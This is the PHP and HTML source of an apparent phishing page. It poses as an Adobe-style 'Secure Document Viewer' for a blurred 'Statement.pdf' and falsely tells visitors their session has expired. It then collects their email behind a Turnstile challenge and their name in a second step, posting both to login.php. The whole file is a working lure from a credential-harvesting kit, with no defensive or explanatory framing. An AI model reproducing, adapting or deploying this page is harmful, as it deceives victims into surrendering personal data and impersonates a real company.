<?php
session_start();

// Step control
$step = $_SESSION['step'] ?? 1;

// Old email
$old_email = $_SESSION['old_email'] ?? '';
$error     = $_SESSION['error_message'] ?? '';
unset($_SESSION['error_message']);

$hasError = !empty($error);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Document Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Cloudflare Turnstile -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

    <style>
        /* Global box-sizing fix */
        *, *::before, *::after {
            box-sizing: border-box;
        }

        /* -------------------------------------------
           Auto Dark/Light Adobe Style Colors
        -------------------------------------------- */
        :root {
            --card-bg: #ffffff;
            --text-color: #222;
            --subtext: #6b6b6b;
            --border: #d1d1d1;
            --btn-bg: #0056D2;      /* Adobe muted blue */
            --btn-hover: #0046b0;
            --error: #c21515;
            --overlay-dark: rgba(0,0,0,0.65);
            --readonly-bg: #e2e4e8; /* darker locked email */
            --divider: #e6e6e6;     /* Adobe-style top divider */
            --font-small: 12px;
            --font-button: 13px;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --card-bg: #1c1c1c;
                --text-color: #eee;
                --subtext: #9b9b9b;
                --border: #333;
                --btn-bg: #4a82ff;
                --btn-hover: #3a68d4;
                --readonly-bg: #2b2f37;
                --divider: #2c2c2c;
            }
        }

        /* -------------------------------------------
           PAGE BACKGROUND
        -------------------------------------------- */
        body {
            margin: 0;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background: #111;
            color: var(--text-color);
            min-height: 100vh;
        }

        .page-wrapper {
            position: relative;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .doc-background {
            position: absolute;
            inset: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            filter: blur(6px);
            transform: scale(1.04);
            opacity: 0.7;
        }
        .doc-background img {
            max-width: 100%;
            max-height: 100vh;
            object-fit: contain;
        }

        .page-wrapper::before {
            content: "";
            position: absolute;
            inset: 0;
            background: var(--overlay-dark);
            pointer-events: none;
        }

        /* -------------------------------------------
           CARD (compact Adobe style)
        -------------------------------------------- */
        .login-card {
            position: relative;
            z-index: 2;
            width: 95%;
            max-width: 320px;
            background: var(--card-bg);
            border-radius: 6px;
            padding: 20px 22px 24px;
            box-shadow: 0 12px 32px rgba(0,0,0,0.35);
            overflow: hidden;
            opacity: 0;
            transform: translateY(14px) scale(0.98);
            animation: cardIn 0.55s ease-out forwards;
            border: 1px solid transparent;
        }

        /* Soft subtle error border */
        .login-card.has-error {
            border-color: rgba(194, 21, 21, 0.35);
            box-shadow: 0 12px 32px rgba(0,0,0,0.45);
        }

        /* Top divider line inside card */
        .top-divider {
            width: 100%;
            height: 1px;
            background: var(--divider);
            margin: 10px 0 14px;
        }

        @keyframes cardIn {
            from { opacity: 0; transform: translateY(18px) scale(0.97); }
            to   { opacity: 1; transform: translateY(0) scale(1); }
        }

        /* PDF Icon */
        .doc-icon {
            width: 40px;
            height: 40px;
            margin: 0 auto 8px;
        }

        .doc-icon-img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        /* Titles */
        .doc-title {
            font-size: 15px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 4px;
        }

        .doc-size {
            font-weight: 400;
            color: var(--subtext);
            font-size: 11px;
        }

        /* Red session expired text for Step 1 & Step 2 */
        .doc-subtitle {
            text-align: center;
            color: var(--error);
            font-size: 11px;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .login-error {
            color: var(--error);
            font-size: 11px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }

        /* Fields */
        .field-wrapper {
            margin-bottom: 10px;
        }

        .field-wrapper input {
            width: 100%;
            padding: 9px 10px;
            border-radius: 4px;
            border: 1px solid var(--border);
            background: transparent;
            color: var(--text-color);
            font-size: var(--font-small);
        }

        .field-wrapper input:focus {
            border-color: var(--btn-bg);
            box-shadow: 0 0 0 1px rgba(0,100,220,0.2);
        }

        /* Darker locked email (Adobe style) */
        .readonly-input {
            background: var(--readonly-bg);
            color: var(--subtext);
            cursor: not-allowed;
        }

        /* CAPTCHA centered */
        .captcha-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 6px 0 4px;
        }

        .cf-turnstile {
            transform: scale(0.9);
            transform-origin: center center;
        }

        /* Adobe-style button */
        .btn-primary {
            width: 100%;
            padding: 10px 12px;
            background: var(--btn-bg);
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: var(--font-button);
            margin-top: 4px;
            font-weight: 600;
        }

        .btn-primary:hover {
            background: var(--btn-hover);
        }
    </style>
</head>
<body>
<div class="page-wrapper">

    <div class="doc-background">
        <img src="assets/background.png" alt="Document preview">
    </div>

    <div class="login-card<?= $hasError ? ' has-error' : '' ?>">

        <div class="doc-icon">
            <img src="assets/PDtrans.png" class="doc-icon-img">
        </div>

        <h2 class="doc-title">
            Statement.pdf <span class="doc-size">(197 KB)</span>
        </h2>

        <!-- Appears on Step 1 AND Step 2 -->
        <p class="doc-subtitle">Previous session has expired, login to continue.</p>

        <div class="top-divider"></div>

        <?php if ($error): ?>
            <p class="login-error"><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>

        <?php if ($step == 1): ?>
            <!-- STEP 1 — EMAIL + CAPTCHA -->
            <form method="POST" action="login.php">

                <div class="field-wrapper">
                    <input type="email" name="email" placeholder="Enter your email"
                           value="<?= htmlspecialchars($old_email) ?>" required>
                </div>

                <div class="captcha-wrapper">
                    <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
                </div>

                <button class="btn-primary">Next</button>
            </form>

        <?php else: ?>

            <!-- STEP 2 — LOCKED EMAIL + NAME -->
            <form method="POST" action="login.php">

                <div class="field-wrapper">
                    <input type="email"
                           value="<?= htmlspecialchars($old_email) ?>"
                           class="readonly-input"
                           readonly>
                </div>

                <div class="field-wrapper">
                    <input type="text" name="name" placeholder="Enter your name" required>
                </div>

                <button class="btn-primary">Next</button>
            </form>

        <?php endif; ?>
    </div>
</div>
</body>
</html>
